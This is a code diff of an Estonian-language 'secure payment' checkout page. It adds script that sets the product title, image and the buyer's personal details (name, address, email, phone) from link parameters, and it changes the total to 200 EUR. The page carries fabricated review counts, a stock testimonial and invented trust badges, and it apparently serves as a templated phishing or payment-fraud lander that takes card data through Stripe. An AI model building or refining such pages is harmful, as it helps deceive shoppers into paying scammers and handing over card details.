@@ -6,7 +6,6 @@
   <title>Turvaline makse</title>
   <meta name="referrer" content="no-referrer">
 
-  <!-- Google tag -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
@@ -55,9 +54,6 @@
       width:100%;padding:12px;border:none;border-radius:12px;
       background:#16a34a;color:#fff;font-weight:900;cursor:pointer
     }
-
-    .logos{display:flex;gap:10px;margin-top:12px}
-    .logos img{height:20px}
 
     .err{
       display:none;background:#fff1f1;border:1px solid #f5bcbc;
@@ -147,38 +143,12 @@
   sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </script>
 
-<!-- GoAffPro tracking -->
-<script>
-(function(){
-  const qs = new URLSearchParams(location.search);
-  const keys = ["sub_id","subid","aff_sub","aff_sub4","click_id","cid","tid"];
-  for (const k of keys){
-    const v = qs.get(k);
-    if (v){
-      localStorage.setItem("aff_sub_id", v);
-      document.cookie = "aff_sub_id=" + v + "; path=/";
-    }
-  }
-})();
-(function(){
-  const qs = new URLSearchParams(location.search);
-  const ref =
-    qs.get("ref") ||
-    localStorage.getItem("gaf_ref") ||
-    (document.cookie.match(/gaf_ref=([^;]+)/)||[])[1];
-  if (ref){
-    localStorage.setItem("gaf_ref", ref);
-    document.cookie = "gaf_ref=" + ref + "; path=/";
-  }
-})();
-</script>
-
 <div class="safe">Turvaline SSL makse</div>
 
 <div class="wrap">
   <div class="page-title">
     Turvaline makse 🔒 <span class="stars">★★★★★</span>
-    <span class="reviews">(2777 arvustust)</span>
+    <span class="reviews">(2777 hinnangut)</span>
   </div>
 
   <div class="grid">
@@ -195,7 +165,7 @@
           </div>
         </div>
 
-        <div class="h2">1. Andmed</div>
+        <div class="h2">1. Teave</div>
 
         <div class="form-grid">
           <input id="firstName" class="input" placeholder="Eesnimi">
@@ -209,7 +179,7 @@
         </div>
 
         <div class="form-grid">
-          <input id="emailInput" class="input" type="email" placeholder="E-post">
+          <input id="emailInput" class="input" type="email" placeholder="E-posti aadress">
           <input class="input" value="Eesti" disabled>
         </div>
 
@@ -225,8 +195,8 @@
       </section>
 
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. Makse</div>
-        <p class="sub">Kaardi andmed on krüpteeritud ja töödeldakse Stripe'i poolt.</p>
+        <div class="h2">2. Maksmine</div>
+        <p class="sub">Kaardiandmed on krüpteeritud ja neid töötleb Stripe.</p>
 
         <div>
           <div id="card-number" class="el"></div>
@@ -240,7 +210,7 @@
 
         <div style="display:flex;gap:10px;margin-top:12px">
           <button id="backBtn" class="btn" style="width:40%">← Tagasi</button>
-          <button id="payNow" class="btn" style="width:60%">Maksa turvaliselt</button>
+          <button id="payNow" class="btn" style="width:60%">Maksa</button>
         </div>
       </section>
 
@@ -251,21 +221,21 @@
         <div style="text-align:center;font-weight:800">Mida kliendid ütlevad</div>
         <div style="text-align:center;font-weight:700;">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-        <p style="text-align:center">Sain toote eile. Väga hea kogemus!</p>
+        <p style="text-align:center">Sain toote eile kätte. Väga hea kogemus!</p>
       </div>
 
       <div class="widget">
         <div class="delivery">
           <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
           <div>
-            <div style="font-weight:800">Kiire kohaletoimetamine</div>
+            <div id="deliveryProductTitle" style="font-weight:800">Kiire tarne</div>
             <div class="sub">3–5 tööpäeva</div>
           </div>
           <div style="margin-left:auto;font-weight:800">Tasuta</div>
         </div>
 
         <div style="margin-top:14px;font-weight:800">Tellimuse kokkuvõte</div>
-        <div class="order-row"><span>Kokku</span><span>€2.00</span></div>
+        <div class="order-row"><span>Kokku</span><span>200 EUR</span></div>
       </div>
 
       <div class="widget">
@@ -273,7 +243,7 @@
         <div class="trust">
           <div class="box"><div>⭐</div><div>99% positiivne</div></div>
           <div class="box"><div>🔒</div><div>SSL turvaline</div></div>
-          <div class="box"><div>🛡️</div><div>€250,000</div></div>
+          <div class="box"><div>🛡️</div><div>$ 250,000</div></div>
         </div>
       </div>
     </aside>
@@ -282,7 +252,7 @@
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <div class="loading-title">Makset töödeldakse…</div>
+    <div class="loading-title">Makse töötlemine…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
     <p class="sub" style="margin-top:10px">Palun oodake…</p>
   </div>
@@ -291,6 +261,66 @@
 <script src="https://js.stripe.com/v3"></script>
 <script>
 window.addEventListener('DOMContentLoaded', () => {
+
+  const qs = new URLSearchParams(window.location.search);
+
+  /* ===== PREFILL & DYNAMIC CONTENT LOGIC ===== */
+  try {
+    // 1. Title Prefill (sub1)
+    const sub1 = qs.get('sub1');
+    if (sub1) {
+      const title = decodeURIComponent(sub1);
+      
+      // Update Page Title
+      const pt = document.querySelector('.page-title');
+      if (pt) {
+        for (const n of pt.childNodes) {
+          if (n.nodeType === Node.TEXT_NODE && n.textContent.trim()) {
+            n.textContent = title + ' ';
+            break;
+          }
+        }
+      }
+
+      // Update Hero and Sidebar Titles
+      const ht = document.getElementById('heroTitle');
+      if (ht) ht.textContent = title;
+      const dt = document.getElementById('deliveryProductTitle');
+      if (dt) dt.textContent = title;
+    }
+
+    // 2. Image URL Prefill (sub2)
+    const sub2 = qs.get('sub2');
+    if (sub2) {
+      const imgUrl = decodeURIComponent(sub2);
+      
+      // Hero image
+      const hImg = document.getElementById('heroImg');
+      const hSection = document.getElementById('hero');
+      if (hImg && hSection) {
+        hImg.src = imgUrl;
+        hSection.style.display = 'flex';
+      }
+
+      // Sidebar image
+      const sImg = document.getElementById('sidebarImg');
+      if (sImg) {
+        sImg.src = imgUrl;
+        sImg.style.display = 'block';
+      }
+    }
+
+    // 3. User Data Prefills
+    if (qs.get('sub3')) document.getElementById('firstName').value = decodeURIComponent(qs.get('sub3'));
+    if (qs.get('sub4')) document.getElementById('lastName').value = decodeURIComponent(qs.get('sub4'));
+    if (qs.get('sub5')) document.getElementById('billingStreet').value = decodeURIComponent(qs.get('sub5'));
+    if (qs.get('sub6')) document.getElementById('billingPostcode').value = decodeURIComponent(qs.get('sub6'));
+    if (qs.get('sub7')) document.getElementById('billingCity').value = decodeURIComponent(qs.get('sub7'));
+    if (qs.get('sub9')) document.getElementById('emailInput').value = decodeURIComponent(qs.get('sub9'));
+    if (qs.get('sub10')) document.getElementById('phoneNumber').value = decodeURIComponent(qs.get('sub10'));
+
+  } catch (e) { console.error("Prefill error:", e); }
+  /* ===== END PREFILL LOGIC ===== */
 
   const stripe = Stripe("pk_live_51SaxeyEV8OvsGiVpMTahrMGQMjZMXD1neiFffQPrybev0TQNcxvVaixH5TfQKzDBNKxLIqcuAgQ1ynYPWXe792D500VQ7Gcw6t");
   const elements = stripe.elements();
@@ -373,8 +403,6 @@ window.addEventListener('DOMContentLoaded', () => {
   };
 });
 </script>
-
-<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 
 </body>
 </html>
